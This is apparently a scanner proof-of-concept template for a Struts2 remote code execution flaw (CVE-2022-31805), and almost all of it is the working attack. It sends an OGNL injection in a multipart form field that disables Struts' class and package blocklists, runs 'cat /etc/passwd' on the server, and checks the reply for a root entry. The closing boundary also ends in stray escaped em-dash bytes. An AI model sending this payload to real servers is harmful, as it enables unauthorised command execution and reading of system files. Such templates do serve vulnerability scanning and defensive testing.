name: poc-yaml-Struts2-cve-2022-31805-rce
set:
  r1: randomInt(1, 9999)
  r2: randomInt(1, 9999)
manual: true
transport: http
rules:
  - method: POST
    path: "/index.action"
    headers:
      X-CSRF-Token: |-
        {{token}}
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
      Accept: "*/*"
    body: |-
        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
        Content-Disposition: form-data; name=\"id\"

        %{
      (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
      (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
      (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
      (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
      (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
      (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
      (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
      (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
      (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))
        }
      ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94
    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)

detail:
  author: Jaky(https://github.com/Jaky5155)
  links:
    - https://mp.weixin.qq.com/s/taEEl6UQ2yi4cqzs2UBfCg
